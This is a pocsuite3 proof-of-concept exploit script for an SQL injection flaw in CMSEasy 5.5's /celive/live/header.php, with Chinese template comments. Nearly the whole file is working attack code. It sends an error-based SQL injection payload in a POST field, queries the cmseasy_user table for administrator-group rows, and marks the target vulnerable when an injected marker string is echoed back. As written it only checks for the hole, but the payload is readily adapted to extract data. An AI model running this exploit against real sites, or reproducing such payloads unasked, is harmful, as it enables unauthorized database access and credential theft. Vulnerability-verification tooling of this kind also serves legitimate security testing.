from pocsuite3.api import Output,POCBase,register_poc,requests
class CmsEasy(POCBase):
    vulID = '1000'
    version = '1.0'
    author = ['一寸一叶']
    vulDate = '2014'
    createDate = '2020-11-20'
    updateDate = '2020-11-20'
    references = 'https://www.seebug.org/vuldb/ssvid-94004'
    name = 'CMSEasy 5.5 /celive/live/header.php SQL注入漏洞'
    appPowerLink = 'http://www.cmseasy.cn/'  # 漏洞产商主页
    appName = 'CMSEasy'  # 漏洞应用名称
    appVersion = '5.5'  # 漏洞影响版本
    vulType = 'SQL Injection'  # 漏洞类型
    desc = '''/celive/live/header.php存在post注入'''  # 在漏洞描述填写
    samples = []  # 测试成功网址
    install_requires = []  # PoC依赖的第三方模块，尽量不要使用第三方模块，必要时参考后面给出的参考链接
    pocDesc = '''PoC用法描述'''  # 在PoC用法描述填写

    def _verify(self):
        result = {}
        target = self.url + '/celive/live/header.php'
        payload = {
            "xajax": "LiveMessage",
            "xajaxargs[0][name]": "1',(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select 'hello' from cmseasy_user where groupid=2 limit 1))a from information_schema.tables group by a)b),'','','','1','127.0.0.1','2')#"
        }
        res = requests.post(target,payload)
        if 'hello' in str(res.content):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target
            result['VerifyInfo']['Postdata'] = payload
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return result
register_poc(CmsEasy)